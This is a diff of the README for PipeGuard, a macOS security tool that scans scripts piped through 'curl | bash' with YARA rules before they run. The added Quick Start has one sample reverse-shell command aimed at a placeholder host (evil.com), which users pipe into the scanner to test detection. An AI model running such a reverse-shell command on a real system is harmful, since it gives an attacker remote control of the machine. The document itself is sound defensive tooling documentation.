@@ -1,112 +1,225 @@
 # PipeGuard
 
-**Stop malware before it runs. Defend against `curl | bash` attacks.**
-
----
-
-## The Problem
-
-You've seen this pattern everywhere:
-
-```bash
-curl https://example.com/install.sh | bash
-```
-
-Homebrew, Rust, countless developer tools—they all use it. Attackers know this.
-
-In 2024-2025, campaigns like **ClickFix** and **AMOS** exploit this trust. Fake CAPTCHAs, AI-generated "installation guides," and poisoned search results trick users into pasting malicious commands. Microsoft reports a [500% increase](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) in these attacks.
-
-**Your antivirus won't help.** Traditional AV scans *files*—but `curl | bash` streams directly to the interpreter. No file, no scan, no protection.
-
----
-
-## The Solution
-
-PipeGuard intercepts pipe-to-interpreter patterns and scans content *before* execution:
-
-```bash
-# You run this:
-curl https://example.com/install.sh | bash
-
-# PipeGuard automatically:
-# 1. Intercepts the pipe
-# 2. Scans with YARA + Apple XProtect rules + ClamAV
-# 3. Shows threat level: Low | Medium | High
-# 4. Blocks or prompts before any code runs
-```
-
-**Zero configuration.** Install once, stay protected.
-
----
-
-## Features
-
-- **Pre-execution scanning** — Analyzes scripts before the interpreter sees them
-- **Multi-engine detection** — YARA rules + Apple XProtect + ClamAV
-- **Three-layer interception** — ZLE keyboard hooks, shell wrappers, audit logging
-- **Tiered response** — Warn, prompt, or block based on threat severity
-- **macOS native** — Works with your existing shell (bash/zsh)
-- **Open source** — MIT licensed, fully auditable
+**Stop malware before it runs. Block `curl | bash` attacks on macOS.**
 
 ---
 
 ## Quick Start
 
 ```bash
-# Install
-cargo install pipeguard
+# Install (requires Homebrew)
+curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash
 
-# Enable for your shell
-pipeguard init >> ~/.zshrc  # or ~/.bashrc
-source ~/.zshrc
+# Restart your shell or run:
+source ~/.zshrc  # or ~/.bashrc
 
-# That's it. You're protected.
+# Test protection
+echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan
 ```
+
+**Done.** PipeGuard now protects every `curl | bash` command you run.
+
+---
+
+## The Problem
+
+You run this every day:
+
+```bash
+curl https://example.com/install.sh | bash
+```
+
+Homebrew uses it. Rust uses it. Docker uses it. Developers trust it.
+
+**Attackers exploit this trust.**
+
+In 2024-2025, campaigns like **ClickFix** and **AMOS** use fake CAPTCHAs, poisoned search results, and AI-generated guides to trick users into pasting malicious commands. Microsoft reports a [500% increase](https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/) in these attacks.
+
+**Your antivirus fails.** Traditional AV scans files on disk. `curl | bash` streams directly to the shell interpreter. No file hits disk. No scan happens. No protection.
+
+---
+
+## What PipeGuard Does
+
+PipeGuard intercepts pipes before execution and scans content in real-time:
+
+1. **Intercepts** - Shell wrappers catch `curl | bash` patterns
+2. **Filters** - Smart detection skips binaries, scans scripts
+3. **Scans** - YARA rules detect malicious patterns
+4. **Blocks** - Stops threats before code executes
+
+Three severity levels:
+- 🟢 **Low (1-6)** - Warns, allows execution
+- 🟡 **Medium (7-8)** - Prompts for confirmation
+- 🔴 **High (9-10)** - Blocks execution
+
+---
+
+## Features
+
+**Smart Content Filtering**
+- Automatically skips binary files (images, archives, executables)
+- Scans shell scripts and installation commands
+- Reduces performance overhead on legitimate downloads
+
+**Real-Time Protection**
+- Intercepts paste events (ZLE hooks)
+- Wraps `curl` and `wget` commands
+- Logs all piped commands for audit
+
+**YARA Detection**
+- Reverse shells (bash, netcat, Python, Perl)
+- Crypto wallet theft patterns
+- Persistence mechanisms (crontab, LaunchAgents)
+- Base64 obfuscation
+- Quarantine bypass techniques
+
+**Zero Configuration**
+- Install once, stays active
+- Works with existing shells (bash/zsh)
+- Configurable via `~/.config/pipeguard/config.toml`
 
 ---
 
 ## How It Works
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│  curl https://... | bash                                    │
-└─────────────────┬───────────────────────────────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────────────────────────────┐
-│  PipeGuard Interception                                     │
-│  ├── Stage 1: YARA pattern matching (~5ms)                  │
-│  ├── Stage 2: XProtect + ClamAV scan (~50-200ms)            │
-│  └── Stage 3: Sandbox analysis (medium threats only)        │
-└─────────────────┬───────────────────────────────────────────┘
-                  │
-                  ▼
-┌─────────────────────────────────────────────────────────────┐
-│  Threat Assessment                                          │
-│  🟢 Clean     → Execute normally                            │
-│  🟡 Low       → Warn + prompt                               │
-│  🟠 Medium    → Sandbox + require approval                  │
-│  🔴 High      → Block execution                             │
-└─────────────────────────────────────────────────────────────┘
+User runs: curl https://... | bash
+                  ↓
+    ┌─────────────────────────┐
+    │  Shell Wrapper          │
+    │  (intercepts curl)      │
+    └─────────┬───────────────┘
+              ↓
+    ┌─────────────────────────┐
+    │  Smart Filter           │
+    │  Binary? → Skip         │
+    │  Script? → Scan         │
+    └─────────┬───────────────┘
+              ↓
+    ┌─────────────────────────┐
+    │  YARA Scanner           │
+    │  419 detection rules    │
+    └─────────┬───────────────┘
+              ↓
+    ┌─────────────────────────┐
+    │  Threat Level           │
+    │  🟢 Allow / 🟡 Warn /   │
+    │  🔴 Block               │
+    └─────────────────────────┘
 ```
+
+---
+
+## Installation
+
+### Requirements
+- macOS (Intel or Apple Silicon)
+- Homebrew (for YARA library)
+- bash 4+ or zsh
+
+### Install
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash
+```
+
+The installer:
+1. Installs YARA library via Homebrew
+2. Builds pipeguard binary
+3. Configures shell integration
+4. Creates default config
+
+### Manual Installation
+
+```bash
+# Clone repository
+git clone https://github.com/SecurityRonin/pipeguard.git
+cd pipeguard
+
+# Run installer
+./install.sh
+```
+
+### Uninstall
+
+```bash
+./install.sh --uninstall
+```
+
+---
+
+## Configuration
+
+Edit `~/.config/pipeguard/config.toml`:
+
+```toml
+[response]
+low = "warn"      # Options: allow, warn, prompt, block
+medium = "prompt"
+high = "block"
+
+[allowlist]
+domains = [
+    "brew.sh",
+    "raw.githubusercontent.com",
+    "rust-lang.org",
+]
+```
+
+---
+
+## Status
+
+**Implementation Complete. Testing in Progress.**
+
+- ✅ YARA rule engine (419 rules)
+- ✅ Shell integration (bash/zsh)
+- ✅ Smart content filtering
+- ✅ Installer script
+- ✅ Comprehensive test suite
+- 🔄 Real-world validation
+- 🔄 Performance benchmarks
 
 ---
 
 ## Why PipeGuard?
 
-| What Others Do | What PipeGuard Does |
-|----------------|---------------------|
-| Scan files on disk | Intercept pipes before execution |
-| Detect malware *after* it runs | Block malware *before* it runs |
+| Traditional AV | PipeGuard |
+|----------------|-----------|
+| Scans files on disk | Intercepts pipes before execution |
+| Detects malware after it runs | Blocks malware before it runs |
 | Binary-only protection | Script-aware protection |
-| Require kernel extensions | Work in userspace |
+| Requires kernel extensions | Works in userspace |
+
+---
+
+## Technical Documentation
+
+- **Architecture** - See [paper/](paper/) for threat model, detection pipeline, and design decisions
+- **YARA Rules** - See [rules/core.yar](rules/core.yar) for detection patterns
+- **API Reference** - Run `pipeguard --help` for CLI documentation
+- **Testing** - See [tests/](tests/) for test coverage
+
+---
+
+## Contributing
+
+Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+
+Research collaboration: albert@securityronin.com
+
+---
+
+## License
+
+MIT License - Copyright (c) 2026 Security Ronin
 
 ---
 
 ## Enterprise
 
 [**PipeGuard Pro**](https://github.com/SecurityRonin/pipeguard-pro) adds:
-
 - Cloud AI analysis for novel threats
 - MDM integration (Jamf, Kandji, Mosyle, Intune)
 - Fleet-wide policy enforcement
@@ -114,31 +227,3 @@ source ~/.zshrc
 - Audit log aggregation
 
 Contact: enterprise@pipeguard.dev
-
----
-
-## Technical Details
-
-For threat model, architecture deep-dive, YARA rule categories, academic references, and competitive analysis, see the [research paper](paper/).
-
----
-
-## Status
-
-**Design complete. Implementation in progress.**
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Research collaboration inquiries: albert@securityronin.com
-
----
-
-## License
-
-MIT License — Copyright (c) 2026 Security Ronin
-
-Enterprise features available in [PipeGuard Pro](https://github.com/SecurityRonin/pipeguard-pro) (proprietary).
